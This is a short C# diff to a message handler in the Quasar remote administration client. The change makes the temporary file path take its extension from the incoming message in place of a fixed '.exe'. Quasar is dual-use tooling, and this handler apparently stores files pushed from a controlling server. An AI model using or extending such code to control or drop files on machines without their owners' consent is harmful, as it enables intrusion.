@@ -292,7 +292,7 @@ namespace Quasar.Client.Messages
                     if (string.IsNullOrEmpty(filePath))
                     {
                         // generate new temporary file path if empty
-                        filePath = FileHelper.GetTempFilePath(".exe");
+                        filePath = FileHelper.GetTempFilePath(message.FileExtension);
                     }
 
                     if (File.Exists(filePath))
